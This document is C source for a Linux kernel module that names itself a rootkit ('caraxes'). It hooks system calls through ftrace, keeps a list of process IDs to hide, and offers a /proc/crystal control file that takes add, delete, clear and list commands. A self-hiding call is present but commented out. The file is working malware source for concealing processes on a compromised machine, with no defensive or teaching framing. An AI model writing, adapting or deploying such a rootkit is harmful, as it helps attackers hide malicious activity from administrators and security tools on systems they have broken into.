#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/magic.h>
#include <linux/slab.h>
#include <linux/fs.h>

#include "stdlib.h"
#include "rootkit.h"
#include "ftrace_helper.h"
#include "hooks.h"

MODULE_LICENSE("GPL");

/* ---- Hidden PID management ---- */
struct hidden_pid {
    pid_t pid;
    struct list_head list;
};

static LIST_HEAD(hidden_pids);
static spinlock_t hidden_pids_lock;

static bool is_all_digits(const char *s)
{
    if (!s || !*s) return false;
    while (*s) {
        if (*s < '0' || *s > '9') return false;
        s++;
    }
    return true;
}

bool pid_is_hidden(pid_t pid)
{
    struct hidden_pid *hp;
    bool found = false;
    unsigned long flags;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    list_for_each_entry(hp, &hidden_pids, list) {
        if (hp->pid == pid) { found = true; break; }
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
    return found;
}

void hide_pid(pid_t pid)
{
    struct hidden_pid *hp;
    unsigned long flags;
    if (pid <= 0) return;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    list_for_each_entry(hp, &hidden_pids, list) {
        if (hp->pid == pid) { spin_unlock_irqrestore(&hidden_pids_lock, flags); return; }
    }
    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (hp) {
        hp->pid = pid;
        list_add(&hp->list, &hidden_pids);
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

void unhide_pid(pid_t pid)
{
    struct hidden_pid *hp, *tmp;
    unsigned long flags;
    if (pid <= 0) return;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    list_for_each_entry_safe(hp, tmp, &hidden_pids, list) {
        if (hp->pid == pid) {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

void clear_hidden_pids(void)
{
    struct hidden_pid *hp, *tmp;
    unsigned long flags;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    list_for_each_entry_safe(hp, tmp, &hidden_pids, list) {
        list_del(&hp->list);
        kfree(hp);
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

bool fd_is_proc(unsigned int fd)
{
    struct fd f = fdget(fd);
    bool is_proc = false;
    if (f.file) {
        struct super_block *sb = f.file->f_path.dentry->d_sb;
        if (sb && sb->s_magic == PROC_SUPER_MAGIC)
            is_proc = true;
        fdput(f);
    }
    return is_proc;
}

/* ---- /proc interface ---- */
#define PROC_ENTRY_NAME "crystal"

static ssize_t crystal_proc_write(struct file *file, const char __user *ubuf,
                                  size_t len, loff_t *ppos)
{
    char buf[256];
    char *p, *tok;
    size_t n = min(len, sizeof(buf) - 1);

    if (copy_from_user(buf, ubuf, n))
        return -EFAULT;
    buf[n] = '\0';

    p = buf;
    while ((tok = strsep(&p, " \n\t\r")) != NULL) {
        int val;
        if (!*tok) continue;
        if (!strcmp(tok, "clear")) { clear_hidden_pids(); continue; }
        if (!strcmp(tok, "add")) {
            tok = strsep(&p, " \n\t\r");
            if (tok && kstrtoint(tok, 10, &val) == 0) hide_pid(val);
            continue;
        }
        if (!strcmp(tok, "del") || !strcmp(tok, "rm")) {
            tok = strsep(&p, " \n\t\r");
            if (tok && kstrtoint(tok, 10, &val) == 0) unhide_pid(val);
            continue;
        }
        if (!strcmp(tok, "list")) {
            /* dump to kernel log for convenience */
            struct hidden_pid *hp;
            unsigned long flags;
            printk(KERN_INFO "caraxes: hidden PIDs:");
            spin_lock_irqsave(&hidden_pids_lock, flags);
            list_for_each_entry(hp, &hidden_pids, list) {
                printk(KERN_INFO " %d", hp->pid);
            }
            spin_unlock_irqrestore(&hidden_pids_lock, flags);
            printk(KERN_INFO "\n");
            continue;
        }
        /* bare numbers: treat as add */
        if (kstrtoint(tok, 10, &val) == 0) hide_pid(val);
    }

    return len;
}

static ssize_t crystal_proc_read(struct file *file, char __user *ubuf,
                                 size_t count, loff_t *ppos)
{
    char *kbuf;
    size_t len = 0;
    struct hidden_pid *hp;
    unsigned long flags;

    kbuf = kmalloc(4096, GFP_KERNEL);
    if (!kbuf)
        return -ENOMEM;

    spin_lock_irqsave(&hidden_pids_lock, flags);
    list_for_each_entry(hp, &hidden_pids, list) {
        len += scnprintf(kbuf + len, 4096 - len, "%d ", hp->pid);
        if (len >= 4096 - 2)
            break;
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);

    if (len > 0 && len < 4096)
        kbuf[len++] = '\n';

    {
        ssize_t ret = simple_read_from_buffer(ubuf, count, ppos, kbuf, len);
        kfree(kbuf);
        return ret;
    }
}

static const struct proc_ops crystal_proc_ops = {
    .proc_read  = crystal_proc_read,
    .proc_write = crystal_proc_write,
};

static int rk_init(void) {
    int err;
	
    err = fh_install_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
    if (err){
        return err;
    }

    //hide_module();

    //rk_info("module loaded\n");

    spin_lock_init(&hidden_pids_lock);
    if (!proc_create(PROC_ENTRY_NAME, 0644, NULL, &crystal_proc_ops)) {
        printk(KERN_ERR "caraxes: failed to create /proc/%s\n", PROC_ENTRY_NAME);
    } else {
        printk(KERN_DEBUG "caraxes: /proc/%s ready (read/write)\n", PROC_ENTRY_NAME);
    }

    return 0;
}

static void rk_exit(void) {
    fh_remove_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));

    remove_proc_entry(PROC_ENTRY_NAME, NULL);
    clear_hidden_pids();

    //rk_info("module unloaded\n");
}

module_init(rk_init);
module_exit(rk_exit);
